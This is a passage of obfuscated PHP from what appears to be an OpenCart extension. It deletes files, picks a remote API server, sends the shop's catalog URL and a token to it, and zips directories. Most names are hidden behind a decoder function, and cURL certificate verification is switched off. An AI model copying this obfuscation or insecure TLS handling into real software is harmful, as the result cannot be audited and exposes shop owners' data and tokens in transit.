                unlink(DIR_SYSTEM.'../'.$file);
                $subfiles/*
new glob*/=/*
*/glob(dirname($file).'/*');
                if (!count($subfiles))
                {
                    if (is_dir(dirname($file)))
                    {
                        rmdir(dirname($file));
                    }
                }
            }
        }
    }
    
    public function getAPI()
    {
        $servers/*
new array*/=/*
*/array();
        if (!empty($this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580ccb')/*''*/}->{/*'d580d15'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580d15')/*'d58'*/}[/*'82065'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed582065')/*'d'*/]))
        {
            ${/*'7e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580d60')/*'58'*/}[] = $this->{/*'7ed580daa'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580daa')/*'ed580d'*/}->{/*'7ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580df4')/*'80df4'*/}[/*'ed5820b1'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5820b1')/*'20b1'*/];
        }
        
        $conn_servers/*
new explode*/=/*
*/explode(',',$this->{/*'e17'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580e17')/*''*/});
        if ($conn_servers)
        {
            $servers/*
new array_merge*/=/*
*/array_merge($servers,$conn_servers);
        }
        
        foreach($servers as $server)
        {
            if ($server)
            {
                $this->{/*'d580e62'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580e62')/*'577ed580e62'*/} = $server;
                $url_params/*
new parse_url*/=/*
*/parse_url($server);
                $host = ${/*'c'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580eac')/*'77e'*/}[/*'7ed5820'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5820ff')/*'55577ed58'*/];
                if ($this->{/*'f6'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580ef6')/*'580'*/}($host))
                {
                    $this->{/*'55577ed580f40'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580f40')/*'580f'*/}->{/*'5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580f8a')/*'d580f8'*/}[/*'58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58214c')/*''*/] = $server;
                    return $server;
                }
            }
        }
    }
    
    public function checkHost($host)
    {
        $connection = @fsockopen($host, 80, $errno, $errstr, 2);
        if (is_resource($connection))
        {
            if ($this->{/*'d5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580fd5')/*''*/}($this->{/*'577ed58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58101f')/*'55577ed58101'*/}.'index.php?catalog='.HTTP_CATALOG.'&token='.$this->{/*'5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58106a')/*''*/}->{/*'8'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5810b8')/*'ed5810b8'*/}[/*'5577ed58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed582198')/*'d582198'*/]) == 'error')
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        else
        {
            return false;
        }
    }
    
    public function addMessage($type, $message, $replace/*
new false*/=/*
*/false)
    {
        if ($replace)
        {
            $this->{/*'3'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581103')/*''*/}->{/*'4d'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58114d')/*''*/}[$type] = trim($message);
        }
        else
        {
            if ($type !='error' || ($type=='error' && empty($this->{/*'581197'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581197')/*'577ed5811'*/}->{/*'5811e2'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5811e2')/*'577e'*/}[$type])))
            {
                if (isset($this->{/*'58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5811fe')/*'ed5811fe'*/}->{/*'1248'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581248')/*'1248'*/}[$type]))
                {
                    if (substr_count($this->{/*'581293'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581293')/*'d58129'*/}->{/*'2de'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5812de')/*'77ed5812d'*/}[$type],trim($message))==0)
                    {
                        $this->{/*'d58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581328')/*'7ed'*/}->{/*'372'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581372')/*'5577'*/}[$type] = trim($message).'<br/>'.$this->{/*'3bc'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5813bc')/*'555'*/}->{/*'6'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581406')/*'81406'*/}[$type];
                    }
                }
                else
                {
                    $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581450')/*''*/}->{/*'d58149a'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58149a')/*''*/}[$type] = trim($message).'<br/>';
                }
            }
        }
    }
    
	public function fileGet($url, $data/*
new array*/=/*
*/array(), $user_agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0', $cookiefile/*
new null*/=/*
*/null)
    {
		if (extension_loaded('curl'))
        {
        	$ch/*
new curl_init*/=/*
*/curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            if (trim(!ini_get('open_basedir')))
            {
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            }
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_AUTOREFERER, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($ch, CURLOPT_TIMEOUT, 120);
            if ($cookiefile)
            {
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiefile);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiefile);
            }
            curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
            if ($data)
            {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
        	$contents/*
new curl_exec*/=/*
*/curl_exec($ch);
            
        	curl_close($ch);
            
            return $contents;
        }
        else
        {
            $post_data/*
new http_build_query*/=/*
*/http_build_query($data);
            $options/*
new array*/=/*
*/array('http' =>
                array(
                    'method'  => 'POST',
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\nUser-Agent: $user_agent\r\n",
                    'content' => $post_data
                )
            );
            $context/*
new stream_context_create*/=/*
*/stream_context_create($options);
            return file_get_contents($url,false,$context);
        }
	}
    
    public function apiRequest($route,$get=array(),$post=array(),$json=true)
    {
        $api = $this->{/*'5814'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5814e6')/*'d581'*/}();
        if ($api && isset($this->{/*'577ed5815'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581531')/*''*/}->{/*'b'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58157b')/*'b'*/}[/*'821e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5821ec')/*'5821ec'*/]))
        {
            $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5815c5')/*''*/}->{/*'77ed5815e6'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5815e6')/*'81'*/}('addist','token',$this->{/*'577'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581631')/*'81631'*/}->{/*'77ed58167b'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58167b')/*'8167b'*/}[/*'582239'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed582239')/*'82239'*/]);
            $url = $api.'index.php?route='.$route.'&catalog='.HTTP_CATALOG.'&token='.$this->{/*'16c5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5816c5')/*'6c'*/}->{/*'0f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58170f')/*'58170f'*/}[/*'ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed582285')/*''*/].'&'.http_build_query($get);
            $response = $this->{/*'9'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581759')/*'81759'*/}($url,$post);
            
            if ($json)
            {
                return json_decode($response,true);
            }
            else
            {
                return $response;
            }
        }
        else
        {
            return false;
        }
    }
    
    public function zipFiles($folder,$dest)
    {
        // Get real path for our folder
        $rootPath/*
new str_replace*/=/*
*/str_replace('\\','/',realpath($folder));
        
        // Initialize archive object
        $zip/*
new new*/=/*
*/new ZipArchive;
        $zip->{/*'7a4'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5817a4')/*'d5817'*/}($dest, ZipArchive::CREATE);
        
        // Create recursive directory iterator
        $files/*
new new*/=/*
*/new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($rootPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($files as $name => $file) {
            // Get real path for current file
            $filePath/*
new str_replace*/=/*
*/str_replace('\\','/',$file->{/*'5817ef'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5817ef')/*'17ef'*/}());
            
            // Add current file to archive
            if ($filePath != realpath($folder) && is_file($filePath))
            {
                $zip->{/*'d581'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58183a')/*''*/}($filePath,str_replace($rootPath.'/','',$filePath));
            }
        }
        
        // Zip archive will be created only after closing object
        $zip->{/*'581885'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581885')/*'577ed58188'*/}();
    }
}
?>